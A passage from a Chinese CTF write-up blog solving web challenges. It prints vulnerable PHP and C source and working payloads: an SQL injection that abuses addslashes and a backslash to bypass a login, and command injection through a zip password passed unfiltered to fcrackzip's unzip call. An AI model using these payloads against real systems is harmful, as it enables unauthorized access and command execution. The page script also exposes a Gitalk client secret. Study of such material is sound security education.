<p>但是从 data_segment_data_0 的第 8 位开始又被赋予了新值，纠正后的结果为[0x24, 0x2e, 0x23, 0x25, 0x39, 0x0a, 0x27, 0x2e, 0x2e, 0x2d, 0x15, 0x27, 0x20, 0x03, 0x31, 0x31, 0x27, 0x2f, 0x20, 0x2e, 0x3b, 0x3f, 0x42]</p>
<p>最后得到 flag<code>flag&#123;HelloWebAssembly&#125;</code></p>
<h1 id="Confused-question-225"><a href="#Confused-question-225" class="headerlink" title="Confused question(225)"></a>Confused question(225)</h1><p>直接看前端源码给了两个 hint</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--register.php?username=xxx will reg a new user for you with password &#x27;123&#x27;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--login.php.txt--&gt;</span></span><br></pre></td></tr></table></figure>

<p>先看 login.php.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashesForEvery</span>(<span class="params"><span class="variable">$array</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;<span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$array</span>);&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$array</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$loginStr</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;loginstr&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]))&#123;<span class="variable">$loginStr</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="variable">$loginStr</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$loginStr</span>,<span class="variable">$loginStr</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$loginStr</span> <span class="keyword">as</span> <span class="variable">$n</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">addslashesForEvery</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$v</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">addslashesForEvery</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from admin where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;<span class="variable">$_SESSION</span>[<span class="string">&#x27;adminlogin&#x27;</span>] = <span class="number">1</span>; <span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> === <span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello Guest!But you cannot log in!&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为了拿到 flag 需要 n==admin，并且 sql 查询需要成功。首先 str_ireplace 将 loginStr 中的所有的 admin 都替换为 guest，这里可以用 GET 数组绕过，例如<code>?loginstr[admin]=123</code>，parse_str 无法处理数组，那么 $logStr 就为<code>[&#39;admin&#39;=&gt;&#39;123&#39;]</code>，满足 n==admin。过了第一个条件以后就需要先办法让 sql 查询成功，由于没给注册，所以只能考虑 sql 注入。</p>
<p>使用 GET 数组虽然绕过了 n==admin 这个条件，但是 v 就不是一个数组了，只是一个字符串，这时如果把一个字符串当成数组取值的话 php 会将该字符串的第一个字符当作值取出，如果 <code>?loginstr[admin]=&#39;</code> 的话，addslashesForEvery 将 v 过滤以后就变成了<code>\&#39;</code>，这时取出的第一个字符为反斜杠，带入 sql 语句就变成了<code>select * from admin where username = &#39;\&#39; and password = &#39;$password&#39;</code>，这里的反斜杠将 username 后的单引号转义，因此 username 就变成了<code>\&#39; and password =</code>，password 就逃脱了单引号的限制，可以从 password 进行 sql 注入，最后的 payload 为：GET<code>?loginstr[admin]=&#39;</code>，POST<code>password=+ or 1#</code>，带入 sql 语句为<br><code>select * from admin where username = &#39;\&#39; and password = &#39; or 1#&#39;</code></p>
<p>最后拿到 flag：<code>flag&#123;pHP_H4s_s0_m4Ny_f3a7ur3s&#125;</code></p>
<h1 id="ZipCracker-225"><a href="#ZipCracker-225" class="headerlink" title="ZipCracker(225)"></a>ZipCracker(225)</h1><p>题目说有源码泄露，先扫一下发现.index.php.swp 文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;title&gt;ZipCracker - Crack Your Zip Online&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/foundation/6.2.1/foundation.min.css&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/zipcracker.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">main</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>-<span class="title">bar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>-<span class="title">bar</span>-<span class="title">title</span>&quot;&gt;<span class="title">ZipCracker</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">empty</span>($<span class="title">_FILES</span>[&#x27;<span class="title">zip</span>&#x27;][&#x27;<span class="title">tmp_name</span>&#x27;]) <span class="title">and</span> !<span class="title">empty</span>($<span class="title">_FILES</span>[&#x27;<span class="title">dict</span>&#x27;][&#x27;<span class="title">tmp_name</span>&#x27;])) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">max</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;size&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]) &lt;= <span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">                <span class="comment">// Do you remember 430387 ?</span></span><br><span class="line">                <span class="variable">$zip</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                <span class="variable">$dict</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$option</span> = <span class="string">&quot;-D -p <span class="subst">$dict</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unzip&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="variable">$option</span> = <span class="string">&quot;-u &quot;</span>.<span class="variable">$option</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$cmd</span> = <span class="string">&quot;timeout 3 ./fcrackzip-1.0/fcrackzip <span class="subst">$option</span> <span class="subst">$zip</span>&quot;</span>;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="string">&#x27;file is too large.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&#x27;file is missing&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>-<span class="title">wrapper</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">head</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Crack</span> <span class="title">Your</span> <span class="title">ZIP</span> <span class="title">Online</span></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">subhead</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Only</span> <span class="title">dictionary</span>-<span class="title">based</span> <span class="title">crack</span> <span class="title">is</span> <span class="title">available</span>.&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Both</span> <span class="title">zip</span> <span class="title">and</span> <span class="title">dictionary</span> <span class="title">file</span> <span class="title">must</span> <span class="title">not</span> <span class="title">exceed</span> 1<span class="title">MB</span>.</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">zip</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">ZIP</span> <span class="title">file</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">zip</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">zip</span>&quot; <span class="title">class</span>=&quot;<span class="title">show</span>-<span class="title">for</span>-<span class="title">sr</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">dict</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">Dictionary</span> <span class="title">file</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">dict</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">dict</span>&quot; <span class="title">class</span>=&quot;<span class="title">show</span>-<span class="title">for</span>-<span class="title">sr</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">unzip</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">unzip</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">unzip</span>&quot;&gt;<span class="title">use</span> <span class="title">unzip</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">success</span> <span class="title">button</span>&quot;&gt;<span class="title">Crack</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">res</span>?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最直观的有一个<code>shell_exec($cmd);</code>，但是这里 cmd 命令里面的所有可控输入都是文件的 tmp_name，所以无法直接命令注入，但是这里使用了 fcrackzip 破解 zip 密码，而 fcrackzip 存在命令注入漏洞，当 fcrackzip 开启 unzip 选项时并且找到密码时，fcrackzip 会直接使用该密码解压破解的 zip 文件，而 fcrackzip 正是直接使用了 shell 的 unzip 命令，将 password 带入命令行中没有做任何过滤，因此这里存在一个命令注入漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> REGPARAM <span class="title function_">check_unzip</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *pw)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span> (buff, <span class="string">&quot;unzip -qqtP \&quot;%s\&quot; %s &quot;</span> DEVNULL, pw, file_path[<span class="number">0</span>]);</span><br><span class="line">    status = system (buff);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> REDIR</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status == EXIT_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nPASSWORD FOUND!!!!: pw == %s\n&quot;</span>, pw);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以可以给 zip 文件设置密码 <code>aaa&quot;;cat &quot;flag.php</code> 来执行命令拿到 flag，提交的时候记得选择 use unzip。得到 flag 为：<code>flag&#123;bug_430387_cmd_injection&#125;</code></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/BlueWhale/" rel="tag"># BlueWhale</a>
              <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2019/08/10/Social-Engineering-NoteBook/" rel="prev" title="Social Engineering CheatSheet">
      <i class="fa fa-chevron-left"></i> Social Engineering CheatSheet
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/08/11/AWDL%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="AWDL 协议及漏洞分析">
      AWDL 协议及漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Welcome-to-web-5"><span class="nav-number">1.</span> <span class="nav-text">Welcome to web(5)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Calculator-25"><span class="nav-number">2.</span> <span class="nav-text">Calculator(25)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RapidTyping-50"><span class="nav-number">3.</span> <span class="nav-text">RapidTyping(50)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS1-75"><span class="nav-number">4.</span> <span class="nav-text">XSS1(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-2-75"><span class="nav-number">5.</span> <span class="nav-text">XSS 2(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-SQL-75"><span class="nav-number">6.</span> <span class="nav-text">Basic SQL(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-PHP-75"><span class="nav-number">7.</span> <span class="nav-text">Basic PHP(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Basic-PHP-2-75"><span class="nav-number">8.</span> <span class="nav-text">Basic PHP 2(75)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyXSS-100"><span class="nav-number">9.</span> <span class="nav-text">BabyXSS(100)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BasicFileInclude-150"><span class="nav-number">10.</span> <span class="nav-text">BasicFileInclude(150)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FxxkingBackdoor-175"><span class="nav-number">11.</span> <span class="nav-text">FxxkingBackdoor(175)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Global-Page-175"><span class="nav-number">12.</span> <span class="nav-text">Global Page(175)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BabyCrack-200"><span class="nav-number">13.</span> <span class="nav-text">BabyCrack(200)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Baby-Reverse-200"><span class="nav-number">14.</span> <span class="nav-text">Baby Reverse(200)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Confused-question-225"><span class="nav-number">15.</span> <span class="nav-text">Confused question(225)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZipCracker-225"><span class="nav-number">16.</span> <span class="nav-text">ZipCracker(225)</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Srpopty</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">47</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Srpopty" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Srpopty" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:srpopty@outlook.com" title="E-Mail → mailto:srpopty@outlook.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 2016 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Srpopty</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'fb9b672afa74e328fbe8',
      clientSecret: '7b3efe103d7e694008b943a67e5273ad36ee14a0',
      repo        : 'srpopty.github.io',
      owner       : 'Srpopty',
      admin       : ['Srpopty'],
      id          : '037e13ded5de88b8deb6ded4ca7aa118',
        language: 'zh-CN',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->

</body>
</html>
